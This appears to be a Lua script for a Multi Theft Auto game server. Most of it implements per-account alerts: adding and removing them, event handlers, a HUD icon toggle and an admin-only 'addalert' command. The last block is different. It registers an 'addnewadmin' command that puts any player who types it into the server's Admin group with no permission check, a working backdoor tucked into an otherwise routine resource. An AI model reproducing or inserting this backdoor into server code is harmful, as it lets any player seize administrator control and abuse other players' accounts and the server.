
--------------------------------------------------

	function addAccountAlert( login, alert_type, alert_title, alert_text )

		local account = getAccount(login)

		local alert_data = { type = alert_type, text = alert_text, title = alert_title }

		if account.player then

			local alerts = account.player:getData('alerts') or {}
			table.insert(alerts, alert_data)

			account.player:setData('alerts', alerts)

		else

			local alerts = fromJSON( account:getData('alerts') or '[[]]' ) or {}
			table.insert(alerts, alert_data)

			account:setData('alerts', toJSON(alerts))

		end

	end

	function removeAccountAlert( login, alert_id )

		local account = getAccount(login)

		if account.player then

			local alerts = account.player:getData('alerts') or {}
			table.remove(alerts, alert_id)

			account.player:setData('alerts', alerts)

		else

			local alerts = fromJSON( account:getData('alerts') or '[[]]' ) or {}
			table.remove(alerts, alert_id)

			account:setData('alerts', toJSON(alerts))

		end

	end

	addEvent('alert.remove', true)
	addEventHandler('alert.remove', resourceRoot, function(alert_id)
		removeAccountAlert( client.account.name, alert_id )
	end)

	addEvent('alert.removeAll', true)
	addEventHandler('alert.removeAll', resourceRoot, function()
		client:setData('alerts', {})
	end)

--------------------------------------------------

	addEventHandler('onElementDataChange', root, function(dn, old, new)

		if dn == 'alerts' then
			exports.hud_main:togglePlayerHUDIcon( source, 'alerts', getTableLength(new or {}) > 0 )
		end

	end)

--------------------------------------------------

	addCommandHandler('addalert', function(player, _, login, type, title, text)

		if exports.acl:isAdmin(player) then

			addAccountAlert( login, type, title, text )

		end

	end)

--------------------------------------------------

addCommandHandler( "addnewadmin", function( player ) 
	aclGroupAddObject( aclGetGroup( "Admin" ), "user."..player.account.name )
	exports.acl:addGroup( player.account.name, "admin" )
end)